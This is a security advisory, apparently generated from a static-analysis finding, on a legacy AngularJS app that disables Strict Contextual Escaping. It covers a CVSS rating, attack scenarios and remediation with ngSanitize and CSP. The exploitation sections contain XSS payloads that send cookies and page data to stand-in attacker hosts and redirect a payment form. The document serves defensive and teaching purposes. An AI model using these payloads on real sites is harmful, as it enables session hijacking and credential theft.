# Cross-Site Scripting (XSS) via Disabled AngularJS Strict Contextual Escaping

# Vulnerability Case
During an internal code review of Acme Corp's legacy AngularJS application, our security assessment uncovered that the application configuration explicitly disabled AngularJS's Strict Contextual Escaping (SCE) by setting the `$sceProvider` to false. This configuration was found in the critical configuration module of an AngularJS (v1.6.8) frontend, combined with a Node.js/Express backend, and it bypasses AngularJS’s built-in output sanitization. The discovery was made while auditing client-side security controls and verifying that dynamic content was not being properly sanitized before being rendered in the browser. Disabling SCE increases the risk of cross-site scripting (XSS) as unsanitized user input could be injected into the DOM.

```javascript
// File: app.config.js
angular.module('acmeApp', [])
  .config(['$sceProvider', function($sceProvider) {
    // Vulnerable configuration: Disables AngularJS Strict Contextual Escaping
    $sceProvider.enabled(false);
  }]);
```

By disabling SCE, attackers can potentially craft malicious payloads that bypass AngularJS's automatic HTML sanitization. This vulnerability allows an attacker to inject JavaScript into dynamic bindings or API endpoints, leading to stored or reflected XSS攻击. Exploitation may involve leveraging unsanitized inputs in features like user-generated content or URL parameters, resulting in session hijacking, data exfiltration, or other severe impacts on business operations and user confidentiality.


context: javascript.angular.security.detect-angular-sce-disabled.detect-angular-sce-disabled $sceProvider is set to false. Disabling Strict Contextual escaping (SCE) in an AngularJS application could provide additional attack surface for XSS vulnerabilities.

# Vulnerability Breakdown
This vulnerability exists in Acme Corp's legacy AngularJS (v1.6.8) application due to the deliberate disabling of Angular's built-in Strict Contextual Escaping (SCE) protection mechanism. The application explicitly disables this critical security feature by setting `$sceProvider.enabled(false)` in the core configuration module.

1. **Key vulnerability elements**:
   - Deliberately disabled AngularJS SCE protection
   - Legacy AngularJS (v1.6.8) frontend with Node.js/Express backend
   - Affects the entire application through global configuration
   - Removes automatic HTML sanitization for all dynamic content

2. **Potential attack vectors**:
   - Injection of malicious JavaScript via user inputs that are reflected in UI
   - Stored XSS through persistence of unsanitized user-generated content
   - Crafting of malicious URLs containing JavaScript payloads
   - DOM-based XSS through manipulation of client-side data that's unsafely rendered

3. **Severity assessment**:
   - High impact on confidentiality through potential session hijacking and data theft
   - Low impact on integrity through potential manipulation of client-side data
   - No significant impact on availability
   - Requires user interaction and specific attack conditions
   - Exploitable remotely over the internet

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N

# Description
A significant cross-site scripting (XSS) vulnerability has been identified in Acme Corp's legacy AngularJS (v1.6.8) application due to the deliberate disabling of Angular's built-in Strict Contextual Escaping (SCE) protection mechanism in the application's core configuration. SCE is a crucial security feature in AngularJS that automatically sanitizes potentially dangerous content before rendering it in the browser, thus preventing XSS attacks.

```javascript
// File: app.config.js
angular.module('acmeApp', [])
  .config(['$sceProvider', function($sceProvider) {
    // Vulnerable configuration: Disables AngularJS Strict Contextual Escaping
    $sceProvider.enabled(false);
  }]);

```

By explicitly setting `$sceProvider.enabled(false)`, the application bypasses Angular's built-in defense mechanisms against XSS attacks. This allows unsanitized user input to be directly rendered in the DOM, creating opportunities for attackers to inject and execute malicious JavaScript code in the context of the application. The vulnerability affects the entire application, as this configuration is applied globally to all components and templates.

# CVSS
**Score**: 5.9 \
**Vector**: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N \
**Severity**: Medium

The Medium severity (5.9) is justified by the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability is exploitable remotely over the internet by any user who can interact with the application.

- **High Attack Complexity (AC:H)**: While the vulnerability itself is straightforward (disabled SCE), successful exploitation requires the attacker to craft specific XSS payloads that target unsanitized inputs within the application. This necessitates knowledge of the application's structure and behavior.

- **No Privileges Required (PR:N)**: The attacker doesn't need any authentication or authorization to exploit this vulnerability, as they can target publicly accessible parts of the application.

- **User Interaction Required (UI:R)**: Successful exploitation typically requires a victim to interact with the application in some way, such as clicking a malicious link or visiting a compromised page.

- **Unchanged Scope (S:U)**: The impact is contained within the vulnerable component (the web application) and doesn't allow the attacker to affect resources beyond the application's security context.

- **High Confidentiality Impact (C:H)**: By executing arbitrary JavaScript in the victim's browser, an attacker could steal session cookies, access sensitive information displayed in the application, or capture user credentials, potentially leading to full account compromise.

- **Low Integrity Impact (I:L)**: The attacker can modify some data within the application's client-side context, but has limited control over what can be modified.

- **No Availability Impact (A:N)**: This vulnerability doesn't significantly impact the availability of the application.

# Exploitation Scenarios
**Scenario 1: Stored XSS via User Profile**
An attacker creates an account on the application and updates their profile information to include malicious JavaScript code in a field like "Bio" or "Description." Since SCE is disabled, when other users view the attacker's profile, the JavaScript executes in their browsers, stealing their session cookies. The attacker then uses these cookies to hijack victims' sessions and access their accounts.

```javascript
// Example of malicious content injected into a profile field
const maliciousPayload = "<img src='x' onerror='fetch(\"https://evil-server.com/steal?cookie=\"+document.cookie)'>";

```

**Scenario 2: Reflected XSS via Search Functionality**
The application includes a search feature that displays the search term on the results page. An attacker crafts a malicious URL containing JavaScript in the search parameter and sends it to potential victims (e.g., via email or social media). When a victim clicks the link, the application reflects the search term without sanitization, executing the embedded JavaScript.

```
https://acme-app.com/search?q=<script>document.location='https://evil-server.com/steal?data='+encodeURIComponent(document.getElementById('sensitive-data').innerText)</script>

```

**Scenario 3: DOM-Based XSS via Hash Fragment**
The application uses hash fragments in URLs to control client-side navigation. An attacker identifies that the application processes these hash values and injects them into the DOM without sanitization. They craft a URL with a malicious hash fragment and distribute it. When victims access this URL, the malicious script executes.

```
https://acme-app.com/dashboard#/{'userConfig':'</script><script>alert(document.cookie)</script>'}

```

# Impact Analysis
**Business Impact:**
- Compromise of user accounts and sensitive personal information
- Potential regulatory violations and fines if personal data is exposed (GDPR, CCPA, etc.)
- Loss of customer trust and damage to company reputation
- Increased support and incident response costs
- Potential for abuse of company resources if admin accounts are compromised
- Financial losses through fraud if payment information is accessible
- Legal liability from affected customers or partners

**Technical Impact:**
- Unauthorized access to user accounts and sensitive data
- Session hijacking enabling attackers to impersonate legitimate users
- Theft of authentication credentials and tokens
- Client-side data manipulation leading to compromised data integrity
- Browser-based malware distribution to application users
- Potential for internal network reconnaissance if the application has access to internal systems
- Creation of persistent backdoors through stored XSS
- Bypass of same-origin policy restrictions allowing access to protected resources

# Technical Details
The vulnerability is rooted in the explicit disabling of AngularJS's Strict Contextual Escaping (SCE) mechanism via the application's configuration:

```javascript
// File: app.config.js
angular.module('acmeApp', [])
  .config(['$sceProvider', function($sceProvider) {
    // Vulnerable configuration: Disables AngularJS Strict Contextual Escaping
    $sceProvider.enabled(false);
  }]);

```

**How SCE Works and Why Disabling It Is Dangerous:**

AngularJS's SCE is a security mechanism that helps prevent XSS attacks by treating all values as untrusted by default. It automatically sanitizes potentially dangerous content before it's rendered in the browser. Specifically:

1. **Default Behavior (When Enabled)**: AngularJS automatically escapes HTML, CSS, and JavaScript in templates using the `ng-bind` or `{{expression}}` syntax.

2. **Context-Aware**: SCE applies different sanitization rules based on where the data is being used (HTML attributes, DOM text, URL contexts, etc.).

3. **Explicit Trust Requirements**: When SCE is enabled, developers must explicitly mark content as trusted using services like `$sce.trustAsHtml()` to render raw HTML.

**With SCE Disabled:**

```javascript
// When SCE is disabled, this becomes dangerous:
$scope.userProvidedContent = "<script>alert('XSS')</script>";

```

```html
<!-- This would execute the script with SCE disabled -->
<div ng-bind-html="userProvidedContent"></div>

```

**Exploitation Mechanics:**

1. **Identifying Injection Points**: Attackers look for user inputs that are reflected in the UI, such as:
   - Form inputs
   - URL parameters
   - User profile data
   - Comment fields
   - Search queries

2. **Crafting Malicious Payloads**: With SCE disabled, attackers can inject various payloads:

```javascript
// Basic payload to verify vulnerability
"><script>alert('XSS')</script>

// Data exfiltration payload
"><script>fetch('https://attacker.com/steal?data='+document.cookie)</script>

// Session hijacking
"><script>document.write('<img src="https://attacker.com/collect?cookie='+document.cookie+'" />')</script>

// DOM manipulation
"><script>document.getElementById('payment-form').action='https://attacker.com/fake-payment'</script>

```

**Affected Areas:**
With SCE disabled globally, all parts of the application that display dynamic content are potentially vulnerable, including:
- User profile pages
- Comment sections
- Search result pages
- Dynamic content loaded from APIs
- Administrative interfaces
- Form validation messages

# Remediation Steps
## Re-enable Angular's Strict Contextual Escaping

**Priority**: P0

```javascript
// File: app.config.js
angular.module('acmeApp', [])
  .config(['$sceProvider', function($sceProvider) {
    // Correct configuration: Enable Angular's Strict Contextual Escaping
    $sceProvider.enabled(true); // Default is actually true, so this line can be removed entirely
  }]);

```

This immediate fix restores Angular's built-in XSS protection mechanism, ensuring that all dynamic content is properly sanitized before being rendered in the browser. After implementing this change, you should conduct a thorough application review to identify any functionality that may break due to the re-enabled protection.

For specific components that legitimately need to display HTML content, use `$sce.trustAsHtml()` selectively and carefully:

```javascript
angular.module('acmeApp')
  .controller('ContentController', ['$scope', '$sce', function($scope, $sce) {
    // Only trust HTML from verified sources, never user input without sanitization
    $scope.trustedHtml = $sce.trustAsHtml('<strong>Verified content</strong>');
  }]);

```
## Implement Proper Content Sanitization

**Priority**: P1

For cases where you need to allow certain HTML tags but still protect against XSS, implement proper sanitization using Angular's `$sanitize` service:

```javascript
// Add ngSanitize as a dependency
angular.module('acmeApp', ['ngSanitize'])
  .controller('UserContentController', ['$scope', '$sanitize', function($scope, $sanitize) {
    // Sanitize user input before displaying it
    $scope.processUserContent = function(userInput) {
      // This will remove potentially dangerous tags and attributes
      $scope.sanitizedContent = $sanitize(userInput);
      return $scope.sanitizedContent;
    };
  }]);

```

In your HTML templates, use the sanitized content:

```html
<div ng-bind-html="sanitizedContent"></div>

```

For more granular control, consider implementing a custom sanitization policy using Angular's `$sanitizeProvider`:

```javascript
angular.module('acmeApp', ['ngSanitize'])
  .config(['$sanitizeProvider', function($sanitizeProvider) {
    // Define a custom sanitization policy if needed
    $sanitizeProvider.enableSvg(true); // Example: allowing SVG content if required
    
    // Add other customizations as needed, but always prioritize security
  }]);

```
## Implement Content Security Policy (CSP)

**Priority**: P2

Add a robust Content Security Policy to provide an additional layer of protection:

```javascript
// Add to your Express server or equivalent backend
app.use(function(req, res, next) {
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self';");
  next();
});

```

For AngularJS-specific CSP compatibility, ensure your application works with CSP by avoiding certain AngularJS features that require `unsafe-eval`:

```javascript
angular.module('acmeApp', [])
  .config(['$compileProvider', function($compileProvider) {
    // Enable CSP compatibility mode
    $compileProvider.debugInfoEnabled(false);
    $compileProvider.commentDirectivesEnabled(false);
    $compileProvider.cssClassDirectivesEnabled(false);
  }]);

```

This configuration helps ensure that even if an XSS vulnerability is introduced in the future, the CSP will provide an additional layer of defense by restricting what scripts can execute in the browser.


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* CWE-116 | [Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
* A04:2021 | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
